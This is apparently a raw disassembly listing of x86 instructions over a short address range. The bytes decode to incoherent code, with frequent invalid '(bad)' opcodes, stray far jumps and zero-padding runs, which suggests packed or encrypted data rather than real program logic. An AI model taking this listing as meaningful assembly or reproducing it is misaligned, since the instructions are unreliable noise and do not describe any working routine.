  41fcbb:	icebp  
  41fcbc:	xor    edx,ebx
  41fcbe:	loopne 0x41fcf8
  41fcc0:	push   0x7c500f25
  41fcc5:	inc    ecx
  41fcc6:	lds    ecx,FWORD PTR [edx-0x149f148f]
  41fccc:	cmp    eax,0xb14f352b
  41fcd1:	xor    esp,0x71
  41fcd4:	dec    ebx
  41fcd5:	adc    bl,BYTE PTR [esi]
  41fcd7:	call   0x8c9b7db6
  41fcdc:	or     bl,BYTE PTR [esi+ecx*2-0x639b96ea]
  41fce3:	jnp    0x41fd32
  41fce5:	push   ds
  41fce6:	stos   BYTE PTR es:[edi],al
  41fce7:	mov    cl,0x35
  41fce9:	and    BYTE PTR [eax-0x42],dl
  41fcec:	or     DWORD PTR ds:0x232bf2ff,ebx
  41fcf2:	sub    eax,0x2c870679
  41fcf7:	xor    al,0x2b
  41fcf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcfa:	(bad)  
  41fcfb:	call   0x7cb1:0xfcec9775
  41fd02:	push   0xffffffc4
  41fd04:	jecxz  0x41fd3b
  41fd06:	mov    edx,0x6e825e5c
  41fd0b:	and    al,0x33
  41fd0d:	push   cs
  41fd0e:	pop    esi
  41fd0f:	retf   
  41fd10:	add    BYTE PTR fs:[eax],al
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	test   BYTE PTR [esi],dh
  41fd82:	and    eax,0x1535796
  41fd87:	add    BYTE PTR ds:0x9f000001,al
  41fd8d:	popf   
  41fd8e:	frstor [edx]
  41fd90:	test   BYTE PTR [ebp+0x58],dl
  41fd93:	shr    DWORD PTR [ecx+0x3f],0xaa
  41fd97:	popa   
  41fd98:	xor    BYTE PTR ds:0x746c2302,al
  41fd9e:	cmp    eax,0xa470506f
  41fda3:	pop    esi
  41fda4:	pop    esi
  41fda5:	shr    cl,cl
  41fda7:	cli    
  41fda8:	fidivr WORD PTR [edx+0x20]
  41fdab:	sbb    ah,ch
  41fdad:	xor    eax,0x9231fe85
  41fdb2:	and    BYTE PTR [edx],0x9b
  41fdb5:	sbb    ecx,esi
  41fdb7:	or     eax,0x4762a31
  41fdbc:	rcl    dl,cl
  41fdbe:	push   0xe789a2dd
  41fdc3:	jne    0x41fda7
  41fdc5:	jmp    0x41fe0f
  41fdc7:	mov    gs,WORD PTR [ecx]
  41fdc9:	xchg   esi,eax
  41fdca:	into   
  41fdcb:	adc    eax,0xe9a78c4e
  41fdd0:	(bad)  
  41fdd2:	cmc    
  41fdd3:	cmc    
  41fdd4:	ds call 0xe7557359
  41fdda:	into   
  41fddb:	paddusb mm0,QWORD PTR [edx+0x2]
  41fddf:	scas   eax,DWORD PTR es:[edi]
  41fde0:	push   eax
  41fde1:	pushw  0xff99
  41fde4:	sub    DWORD PTR [ecx-0x4c],edx
  41fde7:	cld    
  41fde8:	xchg   ah,bl
  41fdea:	cmp    edi,DWORD PTR [esi]
  41fdec:	jl     0x41fd8a
  41fdee:	sub    BYTE PTR [esi+0x1efb9d19],0xf3
  41fdf5:	push   edi
  41fdf6:	lods   al,BYTE PTR ds:[esi]
  41fdf7:	and    edx,DWORD PTR [ecx-0x40]
  41fdfa:	ins    DWORD PTR es:[edi],dx
  41fdfb:	mov    cs:0x2e41d0b0,al
  41fe01:	not    DWORD PTR [edx-0x5a39f32]
  41fe07:	ds ins BYTE PTR es:[edi],dx
  41fe09:	sub    bl,BYTE PTR [edi+0x549194a1]
  41fe0f:	and    ax,ax
  41fe12:	ja     0x41fe17
  41fe14:	xor    DWORD PTR [ebp+0x2e],eax
  41fe17:	retf   0xa2e7
  41fe1a:	jnp    0x41fde1
  41fe1c:	shl    DWORD PTR ds:0xc2feadd4,0x53
  41fe23:	xor    eax,0xfe6b596f
  41fe28:	sbb    ch,bh
  41fe2a:	or     ch,BYTE PTR [ecx-0x4d]
  41fe2d:	inc    edi
  41fe2e:	stos   BYTE PTR es:[edi],al
  41fe2f:	or     al,0xe7
  41fe31:	push   eax
  41fe33:	inc    ebp
  41fe34:	repnz mov bl,0xa3
  41fe37:	or     BYTE PTR [ebp-0x7c],bh
  41fe3a:	sbb    edx,DWORD PTR [edx]
  41fe3c:	sar    esp,0xd8
  41fe3f:	pop    esp
  41fe40:	inc    ebp
  41fe41:	jecxz  0x41fdc8
  41fe43:	add    BYTE PTR [esi],0x44
  41fe46:	fldcw  WORD PTR gs:[esi]
  41fe49:	jl     0x41fe0e
  41fe4b:	xor    esi,DWORD PTR [eax-0x39a40b27]
  41fe51:	jge    0x41fe53
  41fe53:	inc    ebp
  41fe54:	test   eax,0xc15cb66e
  41fe59:	cdq    
  41fe5a:	into   
  41fe5b:	rcr    BYTE PTR [ebx+0x554c4437],1
  41fe61:	dec    ecx
  41fe62:	(bad)  
  41fe63:	xor    al,0xda
  41fe65:	imul   ebp,DWORD PTR [esp+eax*8],0xffffff95
  41fe69:	mov    edx,0x7aa2580b
  41fe6e:	inc    esi
  41fe6f:	pop    ss
  41fe70:	addr16 nop
  41fe72:	(bad)  
  41fe73:	inc    ecx
  41fe74:	cdq    
  41fe75:	repnz add ebx,DWORD PTR ds:0x8cd96648
  41fe7c:	les    ebx,FWORD PTR [edx+eiz*1+0x7d]
  41fe80:	and    al,0x73
  41fe82:	enter  0x3173,0x14
  41fe86:	nop
  41fe87:	mov    ebp,0x7d210faa
  41fe8c:	(bad)  ds:[ebx+0x8bb2]
	...
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xfc
  41ff01:	xor    edi,DWORD PTR [ebx-0xf]
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xa5000001
  41ff0d:	pop    esi
  41ff0e:	or     BYTE PTR [eax+edx*8+0xa5ee563],al
  41ff15:	mov    al,ds:0xec7b4d0b
  41ff1a:	int    0x28
  41ff1c:	inc    ecx
  41ff1d:	jns    0x41ff62
  41ff1f:	or     cl,BYTE PTR [edx]
  41ff21:	into   
  41ff22:	adc    ax,0xe59c
  41ff26:	nop
  41ff27:	ins    DWORD PTR es:[edi],dx
  41ff28:	cld    
  41ff29:	(bad)  
  41ff2a:	dec    ebp
  41ff2b:	test   eax,0x70571fad
  41ff30:	pop    esp
  41ff31:	(bad)  
  41ff32:	mov    esi,DWORD PTR [eax]
  41ff34:	sbb    cl,BYTE PTR [ecx-0x3f]
  41ff37:	sub    BYTE PTR [ebp+0x41edadf6],dh
  41ff3d:	jp     0x41fef5
  41ff3f:	stc    
  41ff40:	pop    esi
  41ff41:	loope  0x41ff20
  41ff43:	(bad)  
  41ff44:	mov    esi,0xf353b9d4
  41ff49:	enter  0x44e0,0x7e
  41ff4d:	inc    edi
  41ff4e:	xor    ebp,DWORD PTR [esi-0xa]
  41ff51:	call   0x5a50296b
  41ff56:	jmp    0xc5c4cf2d
  41ff5b:	mov    ds:0x8181fdce,eax
  41ff60:	sbb    eax,0x41ca2f15
  41ff65:	int3   
  41ff66:	adc    ch,BYTE PTR [edx]
  41ff68:	cmp    edi,DWORD PTR [edx-0x13f02cc0]
  41ff6e:	mov    dl,0xc9
  41ff70:	sbb    dl,BYTE PTR [edx-0x166c16be]
  41ff76:	cmp    al,0x9
  41ff78:	aas    
  41ff79:	xlat   BYTE PTR ds:[ebx]
  41ff7a:	jp     0x41ff86
  41ff7c:	xchg   edx,eax
  41ff7d:	mov    ecx,DWORD PTR [ebx+edx*4]
  41ff80:	jge    0x41ffef
  41ff82:	test   al,0x61
  41ff84:	jp     0x41ff8d
  41ff86:	adc    BYTE PTR [eax],ah
  41ff88:	xor    eax,0xe336527c
  41ff8d:	dec    eax
  41ff8e:	or     ah,BYTE PTR [edx-0x2d9a52d5]
  41ff94:	sbb    al,0x58
  41ff96:	cld    
  41ff97:	cmp    eax,0x240c4f87
  41ff9c:	dec    edx
  41ff9d:	pop    ebx
  41ff9e:	add    DWORD PTR [eax],eax
  41ffa0:	clc    
  41ffa1:	fdivp  st(6),st
  41ffa3:	pushf  
  41ffa4:	mov    bl,ch
  41ffa6:	mov    ecx,0xc0d4f0f1
  41ffab:	lods   eax,DWORD PTR ds:[esi]
  41ffac:	mov    esi,DWORD PTR [ecx+eax*8+0x74]
  41ffb0:	xchg   ecx,eax
  41ffb1:	scas   al,BYTE PTR es:[edi]
  41ffb2:	repz push 0xfffffffc
  41ffb5:	xchg   esp,eax
  41ffb6:	int3   
  41ffb7:	and    al,0x87
  41ffb9:	fld    TBYTE PTR [ebp+ebx*8+0x9234c24]
  41ffc0:	(bad)  
  41ffc1:	mov    bl,0xee
  41ffc3:	imul   esp,DWORD PTR [ebx],0xbbb17b31
  41ffc9:	loop   0x42000b
  41ffcb:	dec    edi
  41ffcc:	mov    ch,0x39
  41ffce:	test   DWORD PTR [edx+ebp*8-0x15c1ac2c],0xe035a3fd
  41ffd9:	add    eax,0x80f508d4
  41ffde:	and    DWORD PTR [ebx+edi*8],0x78
  41ffe2:	adc    eax,0x8f145417
  41ffe7:	mov    edx,0xe37a992
  41ffec:	mov    bl,0x8f
  41ffee:	sub    DWORD PTR [esi+0x9],esp
  41fff1:	stos   DWORD PTR es:[edi],eax
  41fff2:	xchg   ebx,eax
  41fff3:	(bad)  
  41fff4:	sbb    DWORD PTR [edi+0x5a],edx
  41fff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff8:	push   esp
  41fff9:	std    
  41fffa:	xor    al,0x97
  41fffc:	sub    ch,dl
  41fffe:	jns    0x41fffb
  420000:	enter  0x2664,0xc9
  420004:	pop    ebp
  420005:	int    0xf2
  420007:	pop    edi
  420008:	mov    bh,0xc3
  42000a:	add    al,0xea
  42000c:	imul   dx,WORD PTR cs:[edi+0x7e],0x0
	...
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffaa
  420081:	mov    edx,0x5561557a
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0xeb000001
  42008d:	add    dh,BYTE PTR [edx+0x19]
  420090:	jb     0x4200f8
  420092:	mov    esi,DWORD PTR [edx-0x469b2f4]
  420098:	sbb    esi,DWORD PTR [eax-0x17]
  42009b:	push   eax
  42009c:	es mov ecx,0x45d8650d
  4200a2:	xchg   ecx,eax
  4200a3:	pop    esp
  4200a4:	rcl    BYTE PTR [ebx-0x76],1
  4200a7:	(bad)  
  4200a9:	and    eax,0x2b412c2f
  4200ae:	xor    BYTE PTR [ecx],bl
  4200b0:	stos   DWORD PTR es:[edi],eax
  4200b1:	cmp    al,0x68
  4200b3:	icebp  
  4200b4:	mov    edx,0x2239600f
  4200b9:	mov    ah,0x83
  4200bb:	sti    
  4200bc:	or     BYTE PTR [edx-0x8],ch
  4200bf:	jmp    0x5e41:0xbfda69c1
  4200c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200c7:	or     al,0xe2
  4200c9:	push   edx
  4200ca:	add    eax,0xfa6cbd3e
  4200cf:	lea    ebx,[esi+0x14bb538a]
  4200d5:	pop    edi
  4200d6:	xchg   ecx,eax
  4200d7:	in     eax,dx
  4200d8:	scas   al,BYTE PTR es:[edi]
  4200d9:	sbb    eax,0x7fd9cc53
  4200de:	inc    edx
  4200df:	push   edi
  4200e0:	dec    edx
  4200e1:	jno    0x4200a1
  4200e3:	sub    esp,DWORD PTR [esi-0x1efd42c]
  4200e9:	js     0x420079
  4200eb:	xor    DWORD PTR [ebx],edx
  4200ed:	mov    cl,0x1
  4200ef:	xor    BYTE PTR [ecx-0x32],0x1
  4200f3:	or     eax,0x11b17ea7
  4200f8:	bound  esp,QWORD PTR [eax+0x15fd6f6c]
  4200fe:	hlt    
  4200ff:	enter  0x202e,0xbb
  420103:	jp     0x420183
  420105:	fs push ebp
  420107:	add    BYTE PTR [ecx-0x3b],0x8f
  42010b:	aad    0x5b
  42010d:	pop    eax
  42010e:	push   edi
  42010f:	pop    ebp
  420110:	fcomp  DWORD PTR [eax]
  420112:	or     BYTE PTR [edx],ah
  420114:	cli    
  420115:	sti    
  420116:	pushf  
  420117:	out    0x5f,al
  420119:	lods   al,BYTE PTR ds:[esi]
  42011a:	mov    esi,0xdb753d54
  42011f:	push   esi
  420120:	out    0x2b,eax
  420122:	or     dl,BYTE PTR [ebp-0x1f]
  420125:	rcl    ch,cl
  420127:	pop    ebp
  420128:	popa   
  420129:	inc    ebx
  42012a:	and    al,0xd7
  42012c:	ror    DWORD PTR [ebx-0x6d4df0f9],1
  420132:	inc    eax
  420133:	push   0xd6bfebf3
  420138:	dec    ebp
  420139:	push   esi
  42013a:	dec    esi
  42013b:	jae    0xcfa0f091
  420141:	xor    esp,esp
  420143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420144:	out    0x84,eax
  420146:	or     BYTE PTR [ebx+0x37],al
  420149:	gs shr dl,1
  42014c:	dec    eax
  42014d:	pop    esp
  42014e:	(bad)  
  42014f:	jnp    0x420102
  420151:	rcl    edx,cl
  420153:	ss add eax,0xe64dcb69
  420159:	fidivr WORD PTR [ecx-0x5]
  42015c:	add    BYTE PTR [edi-0x6973cc2f],dl
  420162:	dec    edi
  420163:	retf   
  420164:	mov    esp,ebp
  420166:	adc    ch,dh
  420168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420169:	lock cdq 
  42016b:	jns    0x4200fb
  42016d:	aaa    
  42016e:	mov    BYTE PTR [esi+0x3b],bl
  420171:	das    
  420172:	jg     0x42017b
  420174:	fwait
  420175:	push   es
  420176:	pop    esp
  420177:	adc    esi,edx
  420179:	adc    al,0xa4
  42017b:	loopne 0x42017c
  42017d:	jo     0x4201be
  42017f:	xor    BYTE PTR [esi+eiz*2+0x6d969e67],dl
  420186:	push   ebx
  420187:	mov    ds:0x6b172467,al
  42018c:	cld    
  42018d:	lea    edi,[ebp+0x7a]
  420190:	jae    0x420192
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x22e8c101],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x54000001
  42020d:	shl    DWORD PTR [ebx],cl
  42020f:	xchg   edx,eax
  420210:	into   
  420211:	int    0xd3
  420213:	sbb    BYTE PTR [eax-0x6454d423],ah
  420219:	xchg   ebx,esi
  42021b:	ins    DWORD PTR es:[edi],dx
  42021c:	in     al,0xc
  42021e:	jne    0x42027a
  420220:	or     BYTE PTR [esi-0x70],dh
  420223:	je     0x420264
  420225:	mov    ?,WORD PTR [ebp+0x6b]
  420228:	pop    ss
  420229:	mov    eax,0x459f886a
  42022e:	and    edi,DWORD PTR [edx]
  420230:	(bad)  
  420231:	sar    BYTE PTR [si],1
  420234:	loope  0x4201d6
  420236:	adc    edi,ecx
  420238:	ret    0x4888
  42023b:	ror    DWORD PTR [esp+edx*2],0x33
  42023f:	fisub  WORD PTR [ebx-0x53]
  420242:	dec    edx
  420243:	jbe    0x42025d
  420245:	inc    ebp
  420246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420247:	mov    fs,WORD PTR [edi+0x24]
  42024a:	bound  edx,QWORD PTR [edx]
  42024c:	jbe    0x420243
  42024e:	cld    
  42024f:	xor    bl,BYTE PTR [ecx+0x46795b3f]
  420255:	leave  
  420256:	sahf   
  420257:	(bad)  
  420258:	test   DWORD PTR fs:[ebx-0x7],eax
  42025c:	fs sub ah,ah
  42025f:	repz mov eax,ds:0xdd8d5c45
  420265:	push   ecx
  420266:	arpl   WORD PTR [ecx+0xb35111d],bx
  42026c:	push   esi
  42026d:	(bad)  
  42026e:	dec    esp
  42026f:	jnp    0x4202c1
  420271:	xor    ebx,esp
  420273:	jle    0x4202c8
  420275:	dec    ebp
  420276:	sub    edi,ecx
  420278:	ja     0x42020a
  42027a:	mul    DWORD PTR [ebp+0x4f1da93b]
  420280:	mov    bl,0x42
  420282:	test   ebp,esi
  420284:	gs popf 
  420286:	scas   eax,DWORD PTR es:[edi]
  420287:	inc    edx
  420288:	div    cl
  42028a:	imul   edi,DWORD PTR [esi+eax*8-0x33ed23af],0x396dd2cc
  420295:	cmp    esp,DWORD PTR [ecx+0x7c]
  420298:	mov    edi,0x2b507f39
  42029d:	cmp    al,0x63
  42029f:	test   BYTE PTR [eax+0x55],bh
  4202a2:	pop    esi
  4202a3:	cwde   
  4202a4:	test   edx,edx
  4202a6:	mov    ecx,0x38b3d42f
  4202ab:	data16 test al,0xc7
  4202ae:	push   ecx
  4202af:	xor    DWORD PTR [eax],ebx
  4202b1:	cld    
  4202b2:	fldcw  WORD PTR [edi-0x48]
  4202b5:	adc    esp,DWORD PTR [edi]
  4202b7:	mov    ebp,DWORD PTR ds:0xadd8843a
  4202bd:	(bad)  
  4202be:	out    dx,al
  4202bf:	mov    ch,0xd5
  4202c1:	ret    
  4202c2:	imul   ebp,DWORD PTR [esi+edi*8],0xfffffff7
  4202c6:	hlt    
  4202c7:	daa    
  4202c8:	mov    ch,0x5f
  4202ca:	jnp    0x42028f
  4202cc:	fnsave [ebp+0x2963cbe6]
  4202d2:	rol    edi,cl
  4202d4:	enter  0x1833,0xc0
  4202d8:	and    DWORD PTR [ebp-0x2b],eax
  4202db:	inc    ebp
  4202dc:	clc    
  4202dd:	pop    ebx
  4202de:	push   ds
  4202df:	int3   
  4202e0:	setb   BYTE PTR [eax+0x2afb401b]
  4202e7:	xor    dl,BYTE PTR [ebx+ecx*2]
  4202ea:	jne    0x420306
  4202ec:	pop    ecx
  4202ed:	add    al,cl
  4202ef:	add    edi,edi
  4202f1:	pop    ebx
  4202f2:	mov    WORD PTR [eax],es
  4202f4:	mov    eax,0x77fe7429
  4202f9:	in     eax,0x53
  4202fb:	jmp    0xea7f2b38
  420300:	cmp    BYTE PTR [edi-0x56eca6de],cl
  420306:	pusha  
  420307:	gs popa 
  420309:	mov    al,ds:0x13e78215
  42030e:	push   ecx
  42030f:	mov    dh,0x75
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	pop    eax
  420381:	inc    esp
  420382:	jbe    0x4203e7
  420384:	imul   edx,DWORD PTR [edi+0x1],0x0
  420388:	add    eax,0x5f000001
  42038d:	in     eax,0x28
  42038f:	inc    ebp
  420390:	mov    ebp,edi
  420392:	outs   dx,BYTE PTR ds:[esi]
  420393:	int3   
  420394:	enter  0x6fff,0xcd
  420398:	dec    edx
  420399:	mov    cl,0x9b
  42039b:	fs push cs
  42039d:	or     esi,DWORD PTR [edi-0x80]
  4203a0:	into   
  4203a1:	ret    
  4203a2:	xchg   ecx,eax
  4203a3:	mov    cl,0xb7
  4203a5:	jmp    0x65b1:0xdd56c3a2
  4203ac:	pop    ds
  4203ad:	sub    eax,ecx
  4203af:	xor    BYTE PTR [ebx+0x136850d8],ch
  4203b5:	clc    
  4203b6:	int3   
  4203b7:	ret    
  4203b8:	inc    ecx
  4203b9:	push   ebp
  4203ba:	xchg   edi,eax
  4203bb:	stos   BYTE PTR es:[edi],al
  4203bc:	adc    esp,DWORD PTR [ecx+0x7bb1c429]
  4203c2:	das    
  4203c3:	(bad)  
  4203c4:	sbb    al,0xf9
  4203c6:	or     esi,DWORD PTR [eax-0x23]
  4203c9:	inc    ecx
  4203ca:	sub    eax,0x92ff8ccf
  4203cf:	push   eax
  4203d0:	dec    ebp
  4203d1:	call   0xed0e:0x490136e6
  4203d8:	mov    DWORD PTR ds:0x92a01014,ecx
  4203de:	or     al,0xf5
  4203e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e1:	(bad)  
  4203e2:	xor    bh,cl
  4203e4:	sahf   
  4203e5:	or     DWORD PTR [bp-0x75],0xd725ec8f
  4203ed:	out    dx,al
  4203ee:	jne    0x420449
  4203f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203f1:	pop    ss
  4203f2:	fnstcw WORD PTR [edx-0x3ccec43d]
  4203f8:	js     0x4203e0
  4203fa:	out    dx,eax
  4203fb:	mov    esp,0xf501d305
  420400:	adc    DWORD PTR [esi-0x3dd73210],ebx
  420406:	aad    0xe4
  420408:	fdiv   QWORD PTR [edi]
  42040a:	add    al,0x73
  42040c:	ret    0x9a27
  42040f:	(bad)  
  420410:	mov    ebp,eax
  420412:	retf   0x7ce6
  420415:	mov    DWORD PTR [eax],ebx
  420417:	mov    ebp,?
  420419:	add    DWORD PTR [edi+edx*4+0x7b73fcda],esp
  420420:	adc    ah,al
  420422:	inc    ebp
  420423:	sbb    al,0x35
  420425:	lds    ebp,FWORD PTR [ebp+0x60229fa7]
  42042b:	push   esi
  42042c:	push   ss
  42042d:	pop    ebp
  42042e:	cs lahf 
  420430:	scas   eax,DWORD PTR es:[edi]
  420431:	mov    dh,0xe8
  420433:	sbb    eax,0x67db43be
  420438:	and    al,0x6c
  42043a:	lods   eax,DWORD PTR ds:[esi]
  42043b:	cdq    
  42043c:	xor    DWORD PTR [ecx+0x799ddfd5],0xde7feba0
  420446:	pop    eax
  420447:	inc    esp
  420448:	bound  ecx,QWORD PTR [eax]
  42044a:	call   0xec5a:0xf735830
  420451:	stos   DWORD PTR es:[edi],eax
  420452:	ds pop ds
  420454:	xchg   edx,eax
  420455:	adc    eax,0xc28a391f
  42045a:	fs jnp 0x4204a8
  42045d:	shl    BYTE PTR [ecx],0xa9
  420460:	cs sbb al,0xd6
  420463:	pop    ebx
  420464:	retf   0xbe8f
  420467:	pop    edi
  420468:	cmp    edx,ebx
  42046a:	mov    di,0x2b77
  42046e:	out    0x3f,al
  420470:	sbb    ebp,DWORD PTR [eax+0x5a]
  420473:	xchg   edx,eax
  420474:	pop    eax
  420475:	xlat   BYTE PTR ds:[ebx]
  420476:	stos   BYTE PTR es:[edi],al
  420477:	mov    bl,0x36
  420479:	fstp   QWORD PTR [eax-0x5a]
  42047c:	fcmovne st,st(5)
  42047e:	inc    edx
  42047f:	neg    DWORD PTR [ebp+ebx*8+0x54]
  420483:	pop    eax
  420484:	mov    dh,0x17
  420486:	and    al,0xad
  420488:	jb     0x420485
  42048a:	(bad)  
  42048b:	adc    esp,DWORD PTR [ebx-0x28]
  42048e:	pop    edi
  42048f:	add    BYTE PTR ds:0x0,0x0
	...
  4204f2:	add    BYTE PTR [eax],al
  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	sbb    eax,0x7011313b
  420505:	pop    eax
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0x27000001
  42050d:	out    0xcb,eax
  42050f:	aaa    
  420510:	mov    al,BYTE PTR [edi-0x65]
  420513:	std    
  420514:	mov    dl,0x37
  420516:	outs   dx,DWORD PTR ds:[si]
  420518:	adc    eax,0x28a71c6d
  42051d:	mov    ds:0x54ad8417,al
  420522:	es out dx,eax
  420524:	(bad)  
  420525:	fcomp  st(4)
  420527:	jge    0x420579
  420529:	jne    0x42053d
  42052b:	out    0x86,eax
  42052d:	imul   BYTE PTR [edx+eax*2]
  420530:	mov    ds:0x8f3d61d,eax
  420535:	out    0x69,eax
  420537:	jo     0x4204d1
  420539:	sub    al,0x63
  42053b:	dec    esi
  42053c:	scas   al,BYTE PTR es:[edi]
  42053d:	jg     0x4205a6
  42053f:	xor    BYTE PTR [ebx-0x4ef1707e],dl
  420545:	sar    DWORD PTR [edx],1
  420547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420548:	leave  
  420549:	leave  
  42054a:	imul   esi,DWORD PTR [ebp+0x7a],0x73
  42054e:	je     0x42055b
  420550:	rcl    DWORD PTR [edi],cl
  420552:	add    bh,dh
  420554:	pop    edx
  420555:	jmp    0x2147:0xb79296a0
  42055c:	mov    ebx,0x10338a05
  420561:	push   ss
  420562:	ss inc edi
  420564:	mov    ebx,0xef3e7c58
  420569:	je     0x420502
  42056b:	push   ebx
  42056c:	cs pop edi
  42056e:	mov    ebx,ebp
  420570:	mov    ch,0x24
  420572:	pcmpeqb mm4,QWORD PTR [edi+0x26]
  420576:	inc    ebp
  420577:	fs mov ebp,0xa60ea8fd
  42057d:	enter  0x63a1,0x99
  420581:	imul   ebx,DWORD PTR [ebx+ebp*2+0x3d],0x79272d87
  420589:	and    eax,0xb566ec11
  42058e:	push   ss
  42058f:	xchg   esi,eax
  420590:	and    al,0x3e
  420592:	pop    ds
  420593:	jnp    0x420606
  420595:	mov    eax,ds:0x225d38ca
  42059a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42059b:	cmp    eax,0x55392445
  4205a0:	sti    
  4205a1:	(bad)  
  4205a2:	cmp    ebx,DWORD PTR [ebp-0x1ff1653f]
  4205a8:	mov    ecx,0x84e9f4f7
  4205ad:	and    dh,ch
  4205af:	pop    ds
  4205b0:	jle    0x420597
  4205b2:	jmp    0x8b17:0x444df1bf
  4205b9:	dec    edi
  4205ba:	mov    edi,0xff6ee453
  4205bf:	pop    esi
  4205c0:	cdq    
  4205c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c2:	imul   edi,eax,0x78
  4205c5:	imul   ebp,DWORD PTR [edx],0xfffffff3
  4205c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205c9:	and    ebp,DWORD PTR [ecx-0x7163f748]
  4205cf:	std    
  4205d0:	pop    ecx
  4205d1:	mov    ch,0xfe
  4205d3:	xor    al,0x8a
  4205d5:	js     0x42062c
  4205d7:	rol    BYTE PTR [esi],1
  4205d9:	cmp    al,0xc2
  4205db:	fadd   DWORD PTR [edi+0x25]
  4205de:	inc    ebx
  4205df:	lods   eax,DWORD PTR ds:[esi]
  4205e0:	mov    cl,0x9e
  4205e2:	jle    0x42056b
  4205e4:	lahf   
  4205e5:	cmc    
  4205e6:	or     BYTE PTR [eax+0x32],ch
  4205e9:	dec    ecx
  4205ea:	mov    WORD PTR [esi-0x45],cs
  4205ed:	sub    BYTE PTR [eax+0x5e],dh
  4205f0:	jns    0x420593
  4205f2:	dec    edx
  4205f3:	arpl   cx,cx
  4205f5:	ja     0x4205a2
  4205f7:	sub    al,0xce
  4205f9:	pop    ebx
  4205fa:	ja     0x4205f3
  4205fc:	jle    0x420650
  4205fe:	and    eax,0x8b3eb22
  420603:	in     al,0x1
  420605:	jmp    0x420617
  420607:	xchg   esp,eax
  420608:	call   0x7083:0x75ad888c
  42060f:	push   0xfffffff6
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	arpl   WORD PTR [esi],dx
  420682:	jmp    0x500:0x159756f
  420689:	add    DWORD PTR [eax],eax
  42068b:	add    BYTE PTR [esi+0xa],al
  42068e:	dec    ecx
  42068f:	push   esi
  420690:	ficomp WORD PTR [esp+ebp*8-0x67]
  420694:	dec    edi
  420695:	data16 ins BYTE PTR es:[edi],dx
  420697:	popf   
  420698:	sbb    eax,0xc4892615
  42069d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42069e:	mov    cl,bl
  4206a0:	fucomip st,st(1)
  4206a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206a3:	pop    edx
  4206a4:	sbb    BYTE PTR [ebp+0x21],ch
  4206a7:	fmul   DWORD PTR [ecx+0x49970a31]
  4206ad:	inc    esp
  4206ae:	inc    edi
  4206af:	push   cs
  4206b0:	call   0x280f:0xfec7fd91
  4206b7:	retf   
  4206b8:	rcr    DWORD PTR [edx],cl
  4206ba:	popa   
  4206bb:	outs   dx,BYTE PTR ds:[esi]
  4206bc:	dec    edx
  4206bd:	sub    edi,eax
  4206bf:	cmp    bl,BYTE PTR [ecx+ecx*8+0x6eb26902]
  4206c6:	push   ebx
  4206c7:	lea    edx,[ebx*1-0x4d5dfbfe]
  4206ce:	mov    ds:0x87d34394,al
  4206d3:	pop    eax
  4206d4:	enter  0x32f6,0x94
  4206d8:	xchg   DWORD PTR [edi],ecx
  4206da:	scas   al,BYTE PTR es:[edi]
  4206db:	dec    edi
  4206dc:	or     al,0xe9
  4206de:	push   esp
  4206df:	xchg   ebx,eax
  4206e0:	mov    ds:0xaf55cdee,al
  4206e5:	and    al,0x7b
  4206e7:	mov    WORD PTR [esi],ss
  4206e9:	pop    ebx
  4206ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206eb:	out    0x15,eax
  4206ed:	div    BYTE PTR [ebx]
  4206ef:	xchg   ebx,eax
  4206f0:	imul   esi,DWORD PTR [edx],0x59525c51
  4206f6:	scas   al,BYTE PTR es:[edi]
  4206f7:	aad    0x82
  4206f9:	int    0x25
  4206fb:	push   ecx
  4206fc:	mov    ch,0x93
  4206fe:	dec    esp
  4206ff:	xchg   ch,al
  420701:	rcl    dl,1
  420703:	add    DWORD PTR [esi+0x6],0xffffffe6
